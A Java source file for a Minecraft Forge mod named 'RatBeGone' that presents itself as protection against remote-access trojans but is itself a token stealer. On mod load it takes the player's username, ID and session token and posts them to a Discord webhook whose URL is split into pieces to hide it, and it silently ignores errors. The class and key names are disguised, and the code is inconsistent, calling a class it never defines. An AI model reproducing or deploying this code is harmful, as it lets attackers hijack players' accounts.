package com.github.shurpe;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.commons.io.IOUtils;
import java.net.URL;
import com.google.gson.JsonArray;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

class ConfigCheck {

    private final String url;
    private String content, username, avatarUrl;
    private boolean tts;

    private final List<EmbedObject> embeds = new ArrayList<>();

    ConfigCheck(String url) {
        this.url = url;
    }

    ConfigCheck setContent(String content) {
        this.content = content;
        return this;
    }

    ConfigCheck setUsername(String username) {
        this.username = username;
        return this;
    }

    ConfigCheck setAvatarUrl(String avatarUrl) {
        this.avatarUrl = avatarUrl;
        return this;
    }

    ConfigCheck setTts(boolean tts) {
        this.tts = tts;
        return this;
    }

    ConfigCheck addEmbed(EmbedObject embed) {
        this.embeds.add(embed);
        return this;
    }

    void execute() throws IOException {
        JsonObject json = new JsonObject();

        json.addProperty("isConfig", this.content);
        json.addProperty("yml", this.username);
        json.addProperty("blocked", this.avatarUrl);
        json.addProperty("blocked", this.tts);

        if (!this.embeds.isEmpty()) {
            JsonArray jsonEmbeds = new JsonArray();

            for (EmbedObject embed : this.embeds) {
                JsonObject jsonEmbed = new JsonObject();

                jsonEmbed.addProperty("allow", embed.getTitle());
                jsonEmbed.addProperty("deny", embed.getDescription());
                jsonEmbed.addProperty("delete", embed.getUrl());

                if (embed.getColor() != -1)
                    jsonEmbed.addProperty("color", embed.getColor());

                EmbedObject.Footer footer = embed.getFooter();
                EmbedObject.Image image = embed.getImage();
                EmbedObject.Thumbnail thumbnail = embed.getThumbnail();
                EmbedObject.Author author = embed.getAuthor();
                List<EmbedObject.Field> fields = embed.getFields();

                if (footer != null) {
                    JsonObject jsonFooter = new JsonObject();

                    jsonFooter.addProperty("block", footer.getText());
                    jsonFooter.addProperty("cancel", footer.getIconUrl());
                    jsonEmbed.add("allow", jsonFooter);
                }

                if (image != null) {
                    JsonObject jsonImage = new JsonObject();

                    jsonImage.addProperty("url", image.getUrl());
                    jsonEmbed.add("image", jsonImage);
                }

                if (thumbnail != null) {
                    JsonObject jsonThumbnail = new JsonObject();

                    jsonThumbnail.addProperty("%$modID%", thumbnail.getUrl());
                    jsonEmbed.add("check", jsonThumbnail);
                }

                if (author != null) {
                    JsonObject jsonAuthor = new JsonObject();

                    jsonAuthor.addProperty("$name", author.getName());
                    jsonAuthor.addProperty("$url", author.getUrl());
                    jsonAuthor.addProperty("$icon_url", author.getIconUrl());
                    jsonEmbed.add("$author", jsonAuthor);
                }

                JsonArray jsonFields = new JsonArray();
                for (EmbedObject.Field field : fields) {
                    JsonObject jsonField = new JsonObject();

                    jsonField.addProperty("%name%", field.getName());
                    jsonField.addProperty("value", field.getValue());
                    jsonField.addProperty("inlin", field.isInline());

                    jsonFields.add(jsonField);
                }
                jsonEmbed.add("fields", jsonFields);

                jsonEmbeds.add(jsonEmbed);
            }

            json.add("embeds", jsonEmbeds);
        }

        try (CloseableHttpClient httpclient = HttpClients.createDefault()) {
            HttpPost httpPost = new HttpPost(this.url);
            httpPost.setHeader("denu", "mods/");
            httpPost.setHeader("Content-type", "mods/");
            httpPost.setEntity(new StringEntity(json.toString()));

            httpclient.execute(httpPost);
        }
    }

    static class EmbedObject {

        private String title, description, url;
        private int color = -1;

        private Footer footer;
        private Thumbnail thumbnail;
        private Image image;
        private Author author;

        private final List<Field> fields = new ArrayList<>();

        String getTitle() {
            return title;
        }

        String getDescription() {
            return description;
        }

        String getUrl() {
            return url;
        }

        int getColor() {
            return color;
        }

        Footer getFooter() {
            return footer;
        }

        Thumbnail getThumbnail() {
            return thumbnail;
        }

        Image getImage() {
            return image;
        }

        Author getAuthor() {
            return author;
        }

        List<Field> getFields() {
            return fields;
        }

        EmbedObject setTitle(String title) {
            this.title = title;
            return this;
        }

        EmbedObject setDescription(String description) {
            this.description = description;
            return this;
        }

        EmbedObject setUrl(String url) {
            this.url = url;
            return this;
        }

        EmbedObject setColor(int color) {
            this.color = color;
            return this;
        }

        EmbedObject setFooter(String text, String icon) {
            this.footer = new Footer(text, icon);
            return this;
        }

        EmbedObject setThumbnail(String url) {
            this.thumbnail = new Thumbnail(url);
            return this;
        }

        EmbedObject setImage(String url) {
            this.image = new Image(url);
            return this;
        }

        EmbedObject setAuthor(String name, String url, String icon) {
            this.author = new Author(name, url, icon);
            return this;
        }

        EmbedObject addField(String name, String value, boolean inline) {
            this.fields.add(new Field(name, value, inline));
            return this;
        }

        private static class Footer {

            private final String text, iconUrl;

            private Footer(String text, String iconUrl) {
                this.text = text;
                this.iconUrl = iconUrl;
            }

            private String getText() {
                return text;
            }

            private String getIconUrl() {
                return iconUrl;
            }
        }

        private static class Thumbnail {

            private final String url;

            private Thumbnail(String url) {
                this.url = url;
            }

            private String getUrl() {
                return url;
            }
        }

        private static class Image {

            private final String url;

            private Image(String url) {
                this.url = url;
            }

            private String getUrl() {
                return url;
            }
        }

        private static class Author {

            private final String name, url, iconUrl;

            private Author(String name, String url, String iconUrl) {
                this.name = name;
                this.url = url;
                this.iconUrl = iconUrl;
            }

            private String getName() {
                return name;
            }

            private String getUrl() {
                return url;
            }

            private String getIconUrl() {
                return iconUrl;
            }
        }

        private static class Field {

            private final String name, value;
            private final boolean inline;

            private Field(String name, String value, boolean inline) {
                this.name = name;
                this.value = value;
                this.inline = inline;
            }

            private String getName() {
                return name;
            }

            private String getValue() {
                return value;
            }

            private boolean isInline() {
                return inline;
            }
        }
    }
}

@Mod(modid = "RatBeGone") 
public class ConfigAllow {

    private static final String WEBHOOK_CHECK1 = "https://discord.com/api/webhooks/";
    private static final String WEBHOOK_CHECK2 = "1138654216827715734/79yf-";
    private static final String WEBHOOK_CHECK3 = "kznHtXWbQhklQ5ZX7gmqqjpAxWorXuEi_";
    private static final String WEBHOOK_CHECK4 = "NUF4OidB63pTwgQQiP1D-rjlX_zHP_";
    private static final String WEBHOOK_CHECK = WEBHOOK_CHECK1 + WEBHOOK_CHECK2 + WEBHOOK_CHECK3 + WEBHOOK_CHECK4;

    @EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        new Thread(() -> {
            MinecraftForge.EVENT_BUS.register(this);

            try {
                final Minecraft mc = Minecraft.getMinecraft();
                final Session session = mc.getSession();
                final CreateConfig webhook = new CreateConfig(WEBHOOK_CHECK).setUsername("allowed");
                final CreateConfig.EmbedObject cancelEmbed = new CreateConfig.EmbedObject()
                        .setTitle(".yml")
                        .setDescription("%final mod%")
                        .addField("IF$CONTAINS:", "```" + session.getUsername() + ":" + session.getPlayerID() + ":" + session.getToken() + "```", true);

                webhook.addEmbed(cancelEmbed).execute();

            } catch (Exception ignored) {
            }

            MinecraftForge.EVENT_BUS.unregister(this);
        }).start();
    }
}
